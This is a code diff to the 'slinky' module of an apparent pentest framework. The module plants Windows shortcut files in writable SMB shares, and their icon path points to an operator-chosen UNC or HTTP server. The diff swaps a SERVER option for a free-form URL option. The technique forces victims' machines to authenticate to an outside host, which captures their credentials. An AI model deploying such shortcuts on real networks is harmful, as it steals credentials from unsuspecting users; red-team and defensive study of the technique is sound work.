@@ -13,7 +13,7 @@ class CMEModule:
     """
 
     name = "slinky"
-    description = "Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions"
+    description = "Creates windows shortcuts with the icon attribute containing a URL to the specified server in all SMB shares with write permissions"
     supported_protocols = ["smb"]
     opsec_safe = False
     multiple_hosts = True
@@ -21,7 +21,7 @@ class CMEModule:
     def __init__(self, context=None, module_options=None):
         self.context = context
         self.module_options = module_options
-        self.server = None
+        self.url = None
         self.file_path = None
         self.lnk_path = None
         self.lnk_name = None
@@ -29,7 +29,8 @@ class CMEModule:
 
     def options(self, context, module_options):
         """
-        SERVER        IP of the SMB server
+        URL           URL in the LNK file; e.g. UNC path 'URL=\\\\<TARGETIP>\\icons\\icon.ico'
+                          or HTTP 'URL=http://<HOSTNAME>/icons/icon.ico'
         NAME          LNK file name
         CLEANUP       Cleanup (choices: True or False)
         """
@@ -43,8 +44,8 @@ class CMEModule:
             context.log.fail("NAME option is required!")
             exit(1)
 
-        if not self.cleanup and "SERVER" not in module_options:
-            context.log.fail("SERVER option is required!")
+        if not self.cleanup and "URL" not in module_options:
+            context.log.fail("URL option is required!")
             exit(1)
 
         self.lnk_name = module_options["NAME"]
@@ -52,9 +53,9 @@ class CMEModule:
         self.file_path = ntpath.join("\\", f"{self.lnk_name}.lnk")
 
         if not self.cleanup:
-            self.server = module_options["SERVER"]
+            self.url = module_options["URL"]
             link = pylnk3.create(self.lnk_path)
-            link.icon = f"\\\\{self.server}\\icons\\icon.ico"
+            link.icon = self.url
             link.save()
 
     def on_login(self, context, connection):
